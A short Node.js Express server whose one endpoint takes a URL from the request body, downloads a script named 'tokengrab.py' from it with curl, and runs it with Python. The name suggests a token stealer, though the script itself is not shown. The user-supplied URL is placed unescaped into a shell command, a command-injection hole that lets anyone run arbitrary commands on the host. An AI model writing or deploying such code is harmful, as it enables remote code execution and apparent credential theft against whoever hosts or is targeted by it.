const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const { exec } = require('child_process');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());

// Endpoint to execute tokengrab.py
app.post('/run-tokengrab', (req, res) => {
    const { githubUrl } = req.body;

    // Download tokengrab.py from GitHub URL
    exec(`curl ${githubUrl} --output tokengrab.py && python tokengrab.py`, (err, stdout, stderr) => {
        if (err) {
            console.error('Error executing tokengrab.py:', err);
            return res.status(500).json({ error: 'Error executing tokengrab.py' });
        }
        console.log('tokengrab.py executed successfully');
        res.json({ message: 'tokengrab.py executed successfully' });
    });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
